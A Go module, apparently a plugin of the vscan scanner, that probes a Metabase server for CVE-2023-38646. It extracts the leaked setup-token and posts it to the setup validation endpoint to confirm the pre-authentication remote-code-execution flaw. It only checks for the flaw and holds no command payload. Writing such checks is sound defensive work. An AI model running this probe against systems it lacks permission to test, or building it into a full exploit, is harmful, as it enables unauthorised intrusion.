package Metabase

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"regexp"
	"strings"
)

func CVE_2023_38646(u string) bool {
	header := make(map[string]string)
	header["Content-Type"] = "application/json"

	if req, err := pkg.HttpRequset(u+"/api/session/properties", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "setup-token") {
			str := req.Body
			var pattern = `"setup-token":"(.*?)"`
			re := regexp.MustCompile(pattern)
			resourceUuid := re.FindStringSubmatch(str)[1]
			payload := "{\"token\":\"" + resourceUuid + "\",\"details\":{\"is_on_demand\":false,\"is_full_sync\":false,\"is_sample\":false,\"cache_ttl\":null,\"refingerprint\":true,\"auto_run_queries\":true,\"schedules\":{},\"details\":{},\"name\":\"test\",\"engine\":\"mysql\"}}}"
			if req2, err := pkg.HttpRequset(u+"/api/setup/validate", "POST", payload, false, header); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req2.Body, "we couldn't connect to the database") {
					pkg.GoPocLog(fmt.Sprintf("Found RCE vuln CVE_2023_38646\n"))

					return true
				}
			}
		}

	}
	return false
}
